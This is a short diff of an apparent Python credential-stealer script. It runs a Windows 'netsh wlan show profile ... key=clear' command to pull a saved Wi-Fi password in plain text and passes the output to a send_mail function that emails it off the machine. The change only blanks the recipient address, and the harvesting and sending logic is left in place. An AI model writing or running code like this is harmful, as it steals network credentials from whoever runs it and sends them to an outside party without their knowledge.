@@ -9,4 +9,4 @@ def send_mail(email, password, message):
 
 commands = "netsh wlan show profile Orange_5G key=clear"
 result = subprocess.check_output(commands, shell=True)
-send_mail("hichamzam@gmail.com", "", message=result)
+send_mail("", "", message=result)
